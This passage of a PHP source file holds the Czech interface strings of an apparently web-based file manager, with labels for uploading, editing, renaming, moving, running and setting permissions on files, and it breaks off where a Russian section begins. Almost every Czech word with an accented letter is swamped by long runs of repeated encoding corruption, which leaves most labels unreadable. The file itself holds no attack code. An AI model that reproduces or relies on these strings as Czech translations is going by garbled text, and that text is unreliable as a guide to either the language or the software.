'edit' => 'OtevÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â­t',
'download' => 'StÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¡hnout',
'upload' => 'Nahraj na server',
'create' => 'VytvoÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½it',
'change' => 'ZmÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½nit',
'save' => 'UloÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¸it',
'set' => 'Nastavit',
'reset' => 'zpÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½t',
'relative' => 'Relatif',

'yes' => 'Ano',
'no' => 'Ne',
'back' => 'ZpÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½t',
'destination' => 'Destination',
'symlink' => 'SymbolickÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ odkaz',
'no_output' => 'PrÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¡zdnÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ vÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½stup',

'user' => 'UÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¸ivatel',
'password' => 'Heslo',
'add' => 'PÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½idat',
'add_basic_auth' => 'pÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½idej zÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¡kladnÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â­ autentizaci',

'uploaded' => 'Soubor "[%1]" byl nahrÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¡n na server.',
'not_uploaded' => 'Soubor "[%1]" nebyl nahrÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¡n na server.',
'already_exists' => 'Soubor "[%1]" uÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¸ exituje.',
'created' => 'Soubor "[%1]" byl vytvoÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½en.',
'not_created' => 'Soubor "[%1]" nemohl bÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½t  vytvoÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½en.',
'really_delete' => 'Vymazat soubor?',
'deleted' => "Byly vymazÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¡ny tyto soubory:\n[%1]",
'not_deleted' => "Tyto soubory nemohly bÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½t vytvoÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½eny:\n[%1]",
'rename_file' => 'PÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ejmenuj soubory:',
'renamed' => 'Soubor "[%1]" byl pÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ejmenovÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¡n na "[%2]".',
'not_renamed' => 'Soubor "[%1]" nemohl bÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½t pÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ejmenovÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¡n na "[%2]".',
'move_files' => 'PÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½emÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â­stit tyto soubory:',
'moved' => "Tyto soubory byly pÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½emÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â­stÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ny do \"[%2]\":\n[%1]",
'not_moved' => "Tyto soubory nemohly bÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½t pÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½emÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â­stÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ny do \"[%2]\":\n[%1]",
'copy_files' => 'ZkopÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â­rovat tyto soubory:',
'copied' => "Tyto soubory byly zkopÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â­rovÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¡ny do \"[%2]\":\n[%1]",
'not_copied' => "Tyto soubory nemohly bÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½t zkopÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â­rovÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¡ny do \"[%2]\":\n[%1]",
'not_edited' => 'Soubor "[%1]" nemohl bÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½t otevÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½en.',
'executed' => "SOubor \"[%1]\" byl spuÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¡tÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½n :\n{%2}",
'not_executed' => "Soubor \"[%1]\" nemohl bÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½t spuÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¡tÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½n:\n{%2}",
'saved' => 'Soubor "[%1]" byl uloÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¸en.',
'not_saved' => 'Soubor "[%1]" nemohl bÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½t uloÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¸en.',
'symlinked' => 'Byl vyvoÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½en symbolickÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ odkaz "[%2]" na soubor "[%1]".',
'not_symlinked' => 'SymbolickÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ odkaz "[%2]" na soubor "[%1]" nemohl bÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½t vytvoÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½en.',
'permission_for' => 'PrÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¡va k "[%1]":',
'permission_set' => 'PrÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¡va k "[%1]" byla zmÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½nÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½na na [%2].',
'permission_not_set' => 'PrÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¡va k "[%1]" nemohla bÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½t zmÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½nÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½na na [%2].',
'not_readable' => 'Soubor "[%1]" nenÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â­ moÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¸no pÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½eÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â­st.'
		);

	case 'ru':

		$date_format = 'd.m.y H:i:s';
		$word_charset = 'KOI8-R';
        
		return array(
